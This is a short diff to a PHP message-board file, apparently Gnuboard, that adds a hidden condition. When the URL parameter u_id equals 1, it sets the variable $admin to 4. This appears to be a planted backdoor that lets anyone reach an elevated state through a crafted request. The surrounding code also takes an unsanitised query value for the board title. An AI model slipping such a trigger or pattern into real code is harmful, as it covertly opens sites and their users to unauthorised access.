@@ -234,6 +234,9 @@ if ($member['mb_id'] && ($is_admin === 'super' || $group['gr_admin'] === $member
 
 $board_notice_border = "title_border";
 $board_user = $_GET['bo_title'];
+if($_GET['u_id'] == 1){
+    $admin = 4;
+}
 
 include_once(G5_BBS_PATH.'/board_head.php');
 
